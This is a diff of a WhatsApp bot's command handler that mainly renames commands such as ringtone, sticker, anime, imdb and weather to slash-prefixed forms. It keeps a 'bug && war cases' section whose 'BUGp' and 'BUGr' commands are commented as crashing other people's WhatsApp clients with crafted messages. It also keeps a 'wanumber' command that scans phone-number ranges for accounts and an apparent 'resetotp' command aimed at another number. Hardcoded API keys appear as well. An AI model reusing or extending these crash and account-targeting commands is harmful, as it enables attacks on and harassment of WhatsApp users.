-		if (!text) return replygcZero(`Example : ${prefix + command} black rover`)
+case '/ringtone': {
+		if (!text) return replygcZero(`Example : ${prefixo + command} black rover`)
         let { ringtone } = require('./lib/scraper')
 		let anutone2 = await ringtone(text)
 		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
 		client.sendMessage(from, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
 	    }
 	    break
-	case 'genshin':
+	case '/genshin':
 if (!text) return replygcZero(`Which genshin are you lookin for?`)
 try {
 const genshin = require("genshin-api")
@@ -5914,25 +5915,25 @@ console.log(err)
 return replygcZero('Error')
 }
 break
-case 'patrick':
-case 'patricksticker': {
+case '/patrick':
+case '/patricksticker': {
 var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/patrick')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 }
 break
-case 'dogesticker':
-case 'dogestick':
-	case 'doge':{
+case '/dogesticker':
+case '/dogestick':
+	case '/doge':{
 var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/doge')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
 }
 break
-case 'lovesticker':
-case 'lovestick' :{
+case '/lovesticker':
+case '/lovestick' :{
 var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/love')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
@@ -5940,8 +5941,8 @@ encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: glob
 
 }
 break
-case 'gura':
-case 'gurastick':{
+case '/gura':
+case '/gurastick':{
 var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/gura')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
@@ -5949,7 +5950,7 @@ encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: glob
 
 }
 break
-	case 'anime': {
+	case '/anime': {
 if (!text) return replygcZero(`Which anime are you lookin for?`)
 const malScraper = require('mal-scraper')
 ZeroStickWait()
@@ -5973,7 +5974,7 @@ let animetxt = `
                 await client.sendMessage(from,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                 }
                 break
-                case 'imdb':
+                case '/imdb':
 if (!text) return replygcZero(`_Name a Series or movie`)
 ZeroStickWait()
             let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
@@ -6006,7 +6007,7 @@ ZeroStickWait()
                 quoted: m,
             })
             break
-            case 'weather':{
+            case '/weather':{
 if (!text) return replygcZero('What location?')
             let wdata = await axios.get(
                 `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
@@ -6033,8 +6034,8 @@ if (!text) return replygcZero('What location?')
            )
            }
            break
-           case 'wanumber': case 'searchno': case 'searchnumber':{
-           	if (!text) return replygcZero(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
+           case '/wanumber': case '/searchno': case '/searchnumber':{
+           	if (!text) return replygcZero(`Provide Number with last number x\n\nExample: ${prefixo + command} 91690913721x`)
 var inputnumber = text.split(" ")[0]
         
         replygcZero(`Searching for WhatsApp account in given range...`)
@@ -6092,9 +6093,9 @@ var inputnumber = text.split(" ")[0]
         }
 break
 	//bug && war cases
-case 'BUGp' : { //crashes mod whatsapps
+case '/BUGp' : { //crashes mod whatsapps
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!text) return replygcZero(`Example : ${prefix + command} Zero bihari😂`)
+if (!text) return replygcZero(`Example : ${prefixo + command} Zero bihari😂`)
 const { Zeroorwot } = require('./wbug/Zerobut2')
 let teks = `${text}`
 {
@@ -6108,14 +6109,14 @@ thumbnailUrl: thumb,
 }
 }
 break
-case 'BUGr':{ //crashes both mod and playstore wa
+case '/BUGr':{ //crashes both mod and playstore wa
 if (!ZeroTheCreator) return ZeroStickOwner()
 const { Zeroorwot } = require('./wbug/Zerobut2')
 let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
 client.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
 }
 break
-case "resetotp": {
+case "/resetotp": {
 if (Input) {
 let cekno = await client.onWhatsApp(Input)
 if (cekno.length == 0) return replygcZero(`The participant is no longer registered on WhatsApp`)
